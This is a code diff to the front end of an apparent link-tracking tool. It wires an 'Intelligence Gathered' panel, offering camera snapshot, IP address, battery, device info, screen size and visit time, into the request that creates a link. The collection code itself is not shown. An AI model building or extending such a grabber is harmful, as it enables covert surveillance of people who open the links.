@@ -218,12 +218,12 @@
         <div class="collect-options">
           <div class="collect-title">⚡ Intelligence Gathered</div>
           <div class="collect-grid">
-            <div class="collect-item"><span>📷</span> Snapshot</div>
-            <div class="collect-item"><span>🌐</span> IP Address</div>
-            <div class="collect-item"><span>🔋</span> Battery %</div>
-            <div class="collect-item"><span>📱</span> Device Info</div>
-            <div class="collect-item"><span>🖥️</span> Screen Size</div>
-            <div class="collect-item"><span>🕐</span> Visit Time</div>
+            <div class="collect-item" data-val="camera"><span>📷</span> Snapshot</div>
+            <div class="collect-item" data-val="ip"><span>🌐</span> IP Address</div>
+            <div class="collect-item" data-val="battery"><span>🔋</span> Battery %</div>
+            <div class="collect-item" data-val="device"><span>📱</span> Device Info</div>
+            <div class="collect-item" data-val="screen"><span>🖥️</span> Screen Size</div>
+            <div class="collect-item" data-val="time"><span>🕐</span> Visit Time</div>
           </div>
         </div>
         
@@ -787,6 +787,7 @@ async function createLink() {
   const label = document.getElementById('linkLabel').value.trim();
   const customPath = document.getElementById('customPath').value.trim();
   const burnAfterRead = document.getElementById('burnAfterRead').checked;
+  const features = Array.from(document.querySelectorAll('.collect-item.active')).map(el => el.dataset.val);
   const err = document.getElementById('createError');
   err.textContent = '';
   if (!url) return (err.textContent = 'Please enter a URL');
@@ -794,7 +795,7 @@ async function createLink() {
     const r = await fetch('/api/links', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ url, label, customPath, burnAfterRead, creatorId: session.userId })
+      body: JSON.stringify({ url, label, customPath, burnAfterRead, creatorId: session.userId, features })
     });
     const d = await r.json();
     if (!r.ok) return (err.textContent = d.error);
